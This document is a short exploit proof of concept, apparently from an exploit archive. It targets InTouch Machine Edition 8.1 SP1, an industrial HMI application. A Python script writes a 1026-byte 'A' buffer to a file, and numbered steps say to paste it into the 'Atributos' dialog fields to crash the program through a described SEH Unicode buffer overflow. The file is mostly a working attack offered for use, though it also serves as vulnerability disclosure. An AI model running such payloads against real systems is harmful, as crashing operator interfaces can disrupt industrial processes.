# Exploit Title: InTouch Machine Edition 8.1 SP1 - 'Atributos' Denial of Service (PoC)
# Discovery by: chuyreds
# Discovery Date: 12019-11-16
# Vendor Homepage: https://on.wonderware.com/
# Software Link : https://on.wonderware.com/intouch-machine-edition
# Tested Version: 8.1 SP1
# Vulnerability Type: Denial of Service (DoS) Local
# Tested on OS: Windows 10 Pro x64 es
# InTouch Machine Edition 8.1 SP1.py


# Steps to Produce the Local Buffer Overflow (SEH Unicode):
# 1.- Run python code: InTouch_Machine_Edition_8.1.py
# 2.- Open InTouch_Machine_Edition_8.1.txt and copy content to clipboard
# 3.- Open ITME v8.1 InTouch Machine Edition
# 4.- On Graficos slect Atributos
# 5.- Paste ClipBoard on "No Redibujar"/"Deshabilitados" and click on "Aceptar"
#!/usr/bin/env python


buffer = "\x41" * 1026
f = open ("InTouch_Machine_Edition_8.1.txt", "w")
f.write(buffer)
f.close()